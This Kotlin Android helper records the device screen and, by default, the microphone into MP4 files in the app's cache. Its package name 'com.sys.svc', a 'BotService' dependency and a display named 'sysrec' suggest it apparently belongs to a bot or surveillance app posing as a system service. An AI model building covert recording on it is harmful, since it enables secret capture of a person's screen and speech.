package com.sys.svc.helpers

import android.content.Context
import android.content.pm.ServiceInfo
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.os.Build
import com.sys.svc.BotService
import com.sys.svc.Logger
import java.io.File

object ScreenRecorder {
    @Volatile private var projection: MediaProjection? = null
    @Volatile private var virtualDisplay: VirtualDisplay? = null
    @Volatile private var recorder: MediaRecorder? = null
    @Volatile private var outFile: File? = null

    fun start(
        ctx: Context,
        withMic: Boolean = true,
        widthScale: Float = 0.5f,
        fps: Int = 24
    ): File? {
        if (recorder != null) return null
        val proj = MediaProjectionHolder.createProjection(ctx) ?: return null
        projection = proj

        var types = ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
        if (withMic) types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
        BotService.get()?.addForegroundTypes(types)

        return try {
            val dm = ctx.resources.displayMetrics
            var w = (dm.widthPixels * widthScale).toInt()
            var h = (dm.heightPixels * widthScale).toInt()
            w -= w % 2; h -= h % 2
            if (w < 2) w = 2
            if (h < 2) h = 2
            val dpi = dm.densityDpi

            val f = File(ctx.cacheDir, "screen_${System.currentTimeMillis()}.mp4")
            val rec = if (Build.VERSION.SDK_INT >= 31) MediaRecorder(ctx)
                      else @Suppress("DEPRECATION") MediaRecorder()
            if (withMic) rec.setAudioSource(MediaRecorder.AudioSource.MIC)
            rec.setVideoSource(MediaRecorder.VideoSource.SURFACE)
            rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            rec.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            rec.setVideoSize(w, h)
            rec.setVideoFrameRate(fps)
            rec.setVideoEncodingBitRate(w * h * fps / 4)
            if (withMic) {
                rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                rec.setAudioEncodingBitRate(128_000)
                rec.setAudioSamplingRate(44100)
            }
            rec.setOutputFile(f.absolutePath)
            rec.prepare()

            val vd = proj.createVirtualDisplay(
                "sysrec", w, h, dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                rec.surface, null, null
            )
            rec.start()
            recorder = rec
            virtualDisplay = vd
            outFile = f
            Logger.i("Rec", "started ${w}x${h}@${fps}")
            f
        } catch (e: Exception) {
            Logger.e("Rec", "start", e)
            BotService.get()?.resetForegroundTypes()
            null
        }
    }

    fun stop(): File? {
        val f = outFile
        try { recorder?.stop() } catch (e: Exception) { Logger.w("Rec", "stop: ${e.message}") }
        try { recorder?.release() } catch (_: Exception) {}
        try { virtualDisplay?.release() } catch (_: Exception) {}
        try { projection?.stop() } catch (_: Exception) {}
        recorder = null
        virtualDisplay = null
        projection = null
        outFile = null
        BotService.get()?.resetForegroundTypes()
        return f
    }

    fun isRecording(): Boolean = recorder != null
}